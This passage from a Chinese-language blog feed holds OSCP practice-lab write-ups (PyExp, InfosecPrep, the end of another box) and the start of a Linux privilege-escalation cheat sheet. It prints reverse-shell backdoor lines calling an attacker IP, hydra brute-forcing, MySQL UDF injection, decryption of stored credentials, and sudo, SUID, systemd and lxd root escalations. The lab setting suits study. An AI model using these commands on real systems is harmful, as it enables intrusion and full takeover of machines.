plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2020/08/12 09:32:01 CMD: UID=0    PID=1472   | /bin/sh -c /home/ganimedes/phobos</span><br></pre></td></tr></table></figure><p>并且每隔一段时间就会去执行&#x2F;ITDEPT下的文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">2020/08/12 09:06:01 CMD: UID=0    PID=978    | /bin/sh -c chmod 777 /home/dawn/ITDEPT/web-control </span><br><span class="line">2020/08/12 09:06:01 CMD: UID=0    PID=977    | /bin/sh -c chmod 777 /home/dawn/ITDEPT/product-control </span><br><span class="line">2020/08/12 09:06:01 CMD: UID=1000 PID=985    | /bin/sh -c /home/dawn/ITDEPT/product-control </span><br><span class="line">2020/08/12 09:06:01 CMD: UID=0    PID=984    | /bin/sh -c chmod 777 /home/dawn/ITDEPT/web-control </span><br><span class="line">2020/08/12 09:06:01 CMD: UID=33   PID=982    | /bin/sh -c /home/dawn/ITDEPT/web-control</span><br></pre></td></tr></table></figure><p>smb远程连接主机看一下共享目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 192.168.222.11 -U guest</span><br></pre></td></tr></table></figure><p>返回</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Password for [WORKGROUP\guest]:</span><br><span class="line"></span><br><span class="line">        Sharename       Type      Comment</span><br><span class="line">        ---------       ----      -------</span><br><span class="line">        print$          Disk      Printer Drivers</span><br><span class="line">        ITDEPT          Disk      PLEASE DO NOT REMOVE THIS SHARE. IN CASE YOU ARE NOT AUTHORIZED TO USE THIS SYSTEM LEAVE IMMEADIATELY.</span><br><span class="line">        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)</span><br><span class="line">Reconnecting with SMB1 for workgroup listing.</span><br><span class="line"></span><br><span class="line">        Server               Comment</span><br><span class="line">        ---------            -------</span><br><span class="line"></span><br><span class="line">        Workgroup            Master</span><br><span class="line">        ---------            -------</span><br><span class="line">        WORKGROUP            WIN2K3STDVIC</span><br></pre></td></tr></table></figure><p>但是我们登录ITDEPT共享文件夹，并没有发现product-control和web-control文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient //192.168.249.11/ITDEPT -U guest</span><br></pre></td></tr></table></figure><p>本地生成后门文件product-control和web-control</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;nc -e /bin/bash 192.168.45.163 4444&#x27; &gt; web-control </span><br><span class="line">echo &#x27;bash -i &gt;&amp; /dev/tcp/192.168.45.163/4444 0&gt;&amp;1&#x27; &gt; product-control</span><br></pre></td></tr></table></figure><p>然后put上传到ITDEPT目录，开启监听，等待反弹shell</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>监听到反弹shell之后，发现权限很低</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure><p>运行sudo -l，返回</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(root) NOPASSWD: /usr/bin/sudo</span><br></pre></td></tr></table></figure><p>直接运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sudo /bin/sh</span><br></pre></td></tr></table></figure><p>获得root权限</p>]]></content>
      
      
      
        <tags>
            
            <tag> Labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCPLab-PyExp</title>
      <link href="/2024/04/15/OSCPLab-PyExp/"/>
      <url>/2024/04/15/OSCPLab-PyExp/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap --min-rate 10000 -p- 192.168.220.118</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE</span><br><span class="line">1337/tcp open  waste</span><br><span class="line">3306/tcp open  mysql</span><br></pre></td></tr></table></figure><p>端口详细信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">1337/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 f7:af:6c:d1:26:94:dc:e5:1a:22:1a:64:4e:1c:34:a9 (RSA)</span><br><span class="line">|   256 46:d2:8d:bd:2f:9e:af:ce:e2:45:5c:a6:12:c0:d9:19 (ECDSA)</span><br><span class="line">|_  256 8d:11:ed:ff:7d:c5:a7:24:99:22:7f:ce:29:88:b2:4a (ED25519)</span><br><span class="line">3306/tcp open  mysql   MySQL 5.5.5-10.3.23-MariaDB-0+deb10u1</span><br><span class="line">| mysql-info: </span><br><span class="line">|   Protocol: 10</span><br><span class="line">|   Version: 5.5.5-10.3.23-MariaDB-0+deb10u1</span><br><span class="line">|   Thread ID: 45</span><br><span class="line">|   Capabilities flags: 63486</span><br><span class="line">|   Some Capabilities: DontAllowDatabaseTableColumn, SupportsLoadDataLocal, SupportsCompression, Support41Auth, Speaks41ProtocolOld, InteractiveClient, FoundRows, LongColumnFlag, IgnoreSigpipes, SupportsTransactions, ODBCClient, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins</span><br><span class="line">|   Status: Autocommit</span><br><span class="line">|   Salt: FQFK&amp;yRnQ*&#125;[0x1)v:]E</span><br><span class="line">|_  Auth Plugin Name: mysql_native_password</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Linux 4.15 - 5.8 (87%), Linux 5.0 (87%), Linux 5.0 - 5.4 (87%), Linux 2.6.32 (87%), Linux 3.4 (87%), Linux 3.5 (87%), Linux 3.7 (87%), Linux 4.2 (87%), Synology DiskStation Manager 5.1 (87%), Linux 2.6.18 (86%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 4 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 3306/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   284.36 ms bogon (192.168.45.1)</span><br><span class="line">2   284.34 ms 192.168.45.254</span><br><span class="line">3   284.39 ms 192.168.251.1</span><br><span class="line">4   271.29 ms bogon (192.168.220.118)</span><br></pre></td></tr></table></figure><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>Google了一下mysql_native_password和MariaDB，好像说有个无密码登录，还有CVE-2012-2122，但是都没登上去，最后不得已爆破</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P /usr/share/wordlists/rockyou.txt 192.168.220.118 mysql</span><br><span class="line">hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 -vV 192.168.220.118 ssh -s 1337</span><br></pre></td></tr></table></figure><p>爆破了很久发现密码是prettywoman，登录mysql</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h 192.168.220.118 -u root -p</span><br></pre></td></tr></table></figure><p>尝试使用mysql执行系统命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show variables like &#x27;%plugin%&#x27;;</span><br><span class="line">show variables like &#x27;%secure_file_priv%&#x27;;</span><br></pre></td></tr></table></figure><p>发现secure_file_priv的值是NULL，意思是不限制mysqld在任意目录的导入导出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">locate lib_mysqludf_sys.so</span><br><span class="line">xxd -p lib_mysqludf_sys.so | tr -d &#x27;\n&#x27; &gt; lib_mysqludf_sys.so.hex</span><br></pre></td></tr></table></figure><p>将.hex文件的内容复制下来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set @shell = xxxxxxx; #xxxx为复制的内容</span><br><span class="line">select binary @shell into dumpfile &#x27;/usr/lib/x86_64-linux-gnu/mariadb19/plugin/udf_sys_exec.so&#x27;;</span><br></pre></td></tr></table></figure><p>但是发现写不进去</p><p>再看一下数据库内容，发现了fernet表，表中的数据如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [data]&gt; select * from fernet;</span><br><span class="line">+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+</span><br><span class="line">| cred                                                                                                                     | keyy                                         |</span><br><span class="line">+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+</span><br><span class="line">| gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys= | UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0= |</span><br><span class="line">+--------------------------------------------------------------------------------------------------------------------------+----------------------------------------------+</span><br><span class="line">1 row in set (0.279 sec)</span><br></pre></td></tr></table></figure><p>搜一下fernet，直接就弹出提示词加密了，现写一个解密的脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"><span class="comment"># 硬编码的密钥</span></span><br><span class="line">key = <span class="string">b&#x27;UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=&#x27;</span></span><br><span class="line"><span class="comment"># key = Fernet.generate_key()  # 生成密钥</span></span><br><span class="line">cipher_suite = Fernet(key)  <span class="comment"># 创建加密/解密套件</span></span><br><span class="line">text = <span class="string">&quot;gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=&quot;</span></span><br><span class="line">decrypted_text = cipher_suite.decrypt(text.encode()).decode()</span><br><span class="line"><span class="built_in">print</span>(decrypted_text)</span><br></pre></td></tr></table></figure><p>输出</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lucy:wJ9`&quot;Lemdv9[FEw-</span><br></pre></td></tr></table></figure><p>成功ssh登录</p><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>运行sudo -l，发现以root用户的权限并且无密码可执行python脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">lucy@pyexp:~$ sudo -l</span><br><span class="line">Matching Defaults entries for lucy on pyexp:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User lucy may run the following commands on pyexp:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/python2 /opt/exp.py</span><br></pre></td></tr></table></figure><p>查看文件内容</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">lucy@pyexp:~$ cat /opt/exp.py</span><br><span class="line">uinput = raw_input(&#x27;how are you?&#x27;)</span><br><span class="line">exec(uinput)</span><br></pre></td></tr></table></figure><p>执行系统命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lucy@pyexp:~$ sudo /usr/bin/python2 /opt/exp.py</span><br><span class="line">how are you?import os; os.system(&quot;/bin/sh&quot;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCPLab-InfosecPrep</title>
      <link href="/2024/04/15/OSCPLab-InfosecPrep/"/>
      <url>/2024/04/15/OSCPLab-InfosecPrep/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>端口信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE    SERVICE</span><br><span class="line">0/tcp     filtered unknown</span><br><span class="line">22/tcp    open     ssh</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 91:ba:0d:d4:39:05:e3:13:55:57:8f:1b:46:90:db:e4 (RSA)</span><br><span class="line">|   256 0f:35:d1:a1:31:f2:f6:aa:75:e8:17:01:e7:1e:d1:d5 (ECDSA)</span><br><span class="line">|_  256 af:f1:53:ea:7b:4d:d7:fa:d8:de:0d:f2:28:fc:86:d7 (ED25519)</span><br><span class="line">80/tcp    open     http</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/secret.txt</span><br><span class="line">|_http-generator: WordPress 5.4.2</span><br><span class="line">7221/tcp  filtered unknown</span><br><span class="line">10330/tcp filtered unknown</span><br><span class="line">33060/tcp open     mysqlx</span><br><span class="line">63495/tcp filtered unknown</span><br></pre></td></tr></table></figure><p>可以看到是一个wp的站点，在&#x2F;robots.txt中发现有一个&#x2F;secret.txt</p><p>访问&#x2F;secret.txt，发现是一串编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LS0...WS0tLS0tCg==</span><br></pre></td></tr></table></figure><h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><p>挂上wpscan，发现版本是5.4.2，并且有&#x2F;xmlrpc.php目录</p><p>没搜到5.4.2的洞，再返回来看secret.txt的内容，猜测是base64编码的，解码之后发现是SSH的私钥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1r...zY3A=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure><p>尝试指定私钥登录服务器，但是没成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i sec root@192.168.212.89</span><br></pre></td></tr></table></figure><p>这时没办法了，正在去看主页内容的时候，发现这样一句话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Oh yea! Almost forgot the only user on this box is “oscp”. </span><br></pre></td></tr></table></figure><p>尝试使用oscp用户去登录服务器，成功</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i sec oscp@192.168.212.89</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>看了一下内核版本是linux 5.4.0-40-generic，开始试了一下CVE-2021-22555本地提权的方法，结果提示目标机器上把依赖so文件给删了</p><p>这时在目录下的ip文件中发现是一个shell脚本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.0$ cat ip</span><br><span class="line">#!/bin/sh</span><br><span class="line">cp /etc/issue-standard /etc/issue</span><br><span class="line">/usr/local/bin/get-ip-address &gt;&gt; /etc/issue</span><br></pre></td></tr></table></figure><h3 id="利用suid提权"><a href="#利用suid提权" class="headerlink" title="利用suid提权"></a>利用suid提权</h3><p>查找suid常用的三条命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure><p>找到&#x2F;usr&#x2F;bin&#x2F;bash命令</p><p>在<a href="https://gtfobins.github.io/%E4%B8%8A%E6%9F%A5%E6%89%BE%EF%BC%8C%E5%8F%91%E7%8E%B0%E7%9B%B4%E6%8E%A5%E8%BF%90%E8%A1%8C">https://gtfobins.github.io/上查找，发现直接运行</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -p</span><br></pre></td></tr></table></figure><p>就能临时转换成为root权限</p><h3 id="利用服务提权"><a href="#利用服务提权" class="headerlink" title="利用服务提权"></a>利用服务提权</h3><p>上面看到了在用户目录下有个ip文件，现在在机器上搜索一下这个文件在&#x2F;etc下的哪里被调用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -r &quot;/home/oscp/ip&quot; /etc/</span><br></pre></td></tr></table></figure><p>返回</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/systemd/system/ip-update.service:ExecStart=/home/oscp/ip</span><br></pre></td></tr></table></figure><p>查看ip-update.service内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Write current ip addr to /etc/issue[Service]</span><br><span class="line">Type=oneshot</span><br><span class="line">RemainAfterExit=true</span><br><span class="line">ExecStart=/home/oscp/ip[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><p>然后把ip的文件的内容给改了就行了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">cp /root/flag.txt /home/oscp/flag.txt</span><br><span class="line">chown oscp:oscp /home/oscp/flag.txt</span><br></pre></td></tr></table></figure><h3 id="利用lxd-lxc提权"><a href="#利用lxd-lxc提权" class="headerlink" title="利用lxd&#x2F;lxc提权"></a>利用lxd&#x2F;lxc提权</h3><p>执行id的时候发现用户属于lxd组</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.0$ id</span><br><span class="line">uid=1000(oscp) gid=1000(oscp) groups=1000(oscp),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lxd)</span><br></pre></td></tr></table></figure><p>然后下载lxd-alpine-builder存储库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/saghul/lxd-alpine-builder.git</span><br><span class="line">cd lxd-alpine-builder/</span><br><span class="line">./build-alpine</span><br><span class="line">ls</span><br><span class="line">alpine-v3.12-x86_64-20200719_2153.tar.gz  build-alpine  LICENSE  README.md</span><br></pre></td></tr></table></figure><p>然后将alpine-v3.12-x86_64-20200719_2153.tar.gz传到目标机器上</p><p>默认lxc不在默认的bin目录下，需要找到命令在哪里</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.0$ find / -name lxc &gt; lxcsearch.txt</span><br><span class="line">-bash-5.0$ head lxcsearch.txt</span><br><span class="line">/snap/lxd/16100/bin/lxc</span><br><span class="line">/snap/lxd/16100/commands/lxc</span><br><span class="line">/snap/lxd/16100/lxc</span><br><span class="line">/snap/lxd/16044/bin/lxc</span><br><span class="line">/snap/lxd/16044/commands/lxc</span><br><span class="line">/snap/lxd/16044/lxc</span><br><span class="line">/snap/bin/lxc</span><br><span class="line">/usr/share/bash-completion/completions/lxc</span><br><span class="line">/etc/bash_completion.d/lxc</span><br><span class="line">/home/oscp/snap/lxd/16100/.config/lxc</span><br></pre></td></tr></table></figure><p>&#x2F;snap&#x2F;bin&#x2F;lxc是我们需要使用的</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.0$ /snap/bin/lxc image import ./alpine-v3.12-x86_64-20200719_2153.tar.gz --alias trenchesofit</span><br><span class="line">Image imported with fingerprint: e279d5bc0806b79884c8a0cf7952c86a53d9da5a23b7e13ee75b42628118b8f9</span><br><span class="line">-bash-5.0$ /snap/bin/lxc image list</span><br><span class="line">+--------------+--------------+--------+-------------------------------+--------------+-----------+--------+-------------------------------+</span><br><span class="line">|    ALIAS     | FINGERPRINT  | PUBLIC |          DESCRIPTION          | ARCHITECTURE |   TYPE    |  SIZE  |          UPLOAD DATE          |</span><br><span class="line">+--------------+--------------+--------+-------------------------------+--------------+-----------+--------+-------------------------------+</span><br><span class="line">| trenchesofit | e279d5bc0806 | no     | alpine v3.12 (20200719_21:53) | x86_64       | CONTAINER | 3.04MB | Jul 22, 2020 at 11:59pm (UTC) |</span><br><span class="line">+--------------+--------------+--------+-------------------------------+--------------+-----------+--------+-------------------------------+</span><br></pre></td></tr></table></figure><p>创建存储池并分配存储位置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.0$ /snap/bin/lxc storage create pool dir</span><br><span class="line">Storage pool pool created</span><br><span class="line">-bash-5.0$ /snap/bin/lxc profile device add default root disk path=/ pool=pool</span><br><span class="line">Device root added to default</span><br><span class="line">-bash-5.0$ /snap/bin/lxc storage list</span><br><span class="line">+------+-------------+--------+---------------------------------------------+---------+</span><br><span class="line">| NAME | DESCRIPTION | DRIVER |                   SOURCE                    | USED BY |</span><br><span class="line">+------+-------------+--------+---------------------------------------------+---------+</span><br><span class="line">| pool |             | dir    | /var/snap/lxd/common/lxd/storage-pools/pool | 1       |</span><br><span class="line">+------+-------------+--------+---------------------------------------------+---------+</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.0$ /snap/bin/lxc init trenchesofit ignite -c security.privileged=true</span><br><span class="line">Creating ignite</span><br><span class="line">                                          </span><br><span class="line">The instance you are starting doesn&#x27;t have any network attached to it.</span><br><span class="line">  To create a new network, use: lxc network create</span><br><span class="line">  To attach a network to an instance, use: lxc network attach</span><br></pre></td></tr></table></figure><p>将目标机器的文件系统挂载并启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.0$ /snap/bin/lxc config device add ignite trenches disk source=/ path=/mnt/root recursive=true</span><br><span class="line">Device trenches added to ignite</span><br><span class="line">-bash-5.0$ /snap/bin/lxc start ignite</span><br></pre></td></tr></table></figure><p>然后在容器中运行bash，得到root权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-bash-5.0$ /snap/bin/lxc exec ignite /bin/sh</span><br><span class="line">~ # </span><br><span class="line">~ # id</span><br><span class="line">uid=0(root) gid=0(root)</span><br></pre></td></tr></table></figure><p>root的文件在&#x2F;mnt&#x2F;root下</p>]]></content>
      
      
      
        <tags>
            
            <tag> Labs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux privilege escalation</title>
      <link href="/2024/04/13/Linux%E5%B8%B8%E7%94%A8%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E5%8F%8A%E6%96%B9%E6%B3%95/"/>
      <url>/2024/04/13/Linux%E5%B8%B8%E7%94%A8%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF%E5%8F%8A%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h2 id="系统信息收集"><a href="#系统信息收集" class="headerlink" title="系统信息收集"></a>系统信息收集</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">Linux版本</span></span><br><span class="line">cat /etc/issue</span><br><span class="line">cat /etc/*-release</span><br><span class="line">cat /etc/lsb-release      # Debian based</span><br><span class="line">cat /etc/redhat-release   # Redhat based</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">内核版本</span></span><br><span class="line">cat /proc/version</span><br><span class="line">uname -a</span><br><span class="line">uname -mrs</span><br><span class="line">rpm -q kernel</span><br><span class="line">dmesg | grep Linux</span><br><span class="line">ls /boot | grep vmlinuz-</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">环境变量信息</span></span><br><span class="line">cat /etc/profile</span><br><span class="line">cat /etc/bashrc</span><br><span class="line">cat ~/.bash_profile</span><br><span class="line">cat ~/.bashrc</span><br><span class="line">cat ~/.bash_logout</span><br><span class="line">env</span><br><span class="line">set</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">是否有打印机</span></span><br><span class="line">lpstat -a</span><br></pre></td></tr></table></figure><h2 id="应用程序和服务信息收集"><a href="#应用程序和服务信息收集" class="headerlink" 